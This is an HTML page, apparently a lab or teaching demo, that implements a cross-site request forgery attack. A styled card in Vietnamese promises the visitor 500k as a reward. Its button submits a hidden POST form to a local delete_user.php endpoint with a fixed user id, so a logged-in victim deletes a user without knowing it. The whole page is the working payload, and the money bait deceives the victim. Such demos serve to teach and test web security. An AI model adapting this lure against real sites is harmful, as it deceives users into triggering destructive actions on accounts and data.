<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <title>CSRF Demo</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background: linear-gradient(135deg, #f7d9e3, #d6eaff);
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }

      .container {
        background: #fff;
        padding: 30px;
        border-radius: 15px;
        box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.2);
        text-align: center;
        width: 350px;
      }

      h2 {
        color: #333;
        margin-bottom: 10px;
      }

      p {
        color: #555;
        margin-bottom: 20px;
        font-size: 16px;
      }

      form button {
        background: linear-gradient(135deg, #ff7eb3, #ff758c);
        border: none;
        color: white;
        padding: 12px 25px;
        font-size: 16px;
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.3s ease;
      }

      form button:hover {
        background: linear-gradient(135deg, #ff4f81, #ff2e63);
        transform: scale(1.05);
        box-shadow: 0px 5px 12px rgba(255, 100, 130, 0.5);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>CSRF Demo</h2>
      <p>Ấn Vào Đây Để Nhận 500k nào</p>
      <form action="http://localhost:8080/delete_user.php" method="POST">
        <input type="hidden" name="id" value="9" />
        <button type="submit">💸 Nhận 500k</button>
      </form>
    </div>
  </body>
</html>
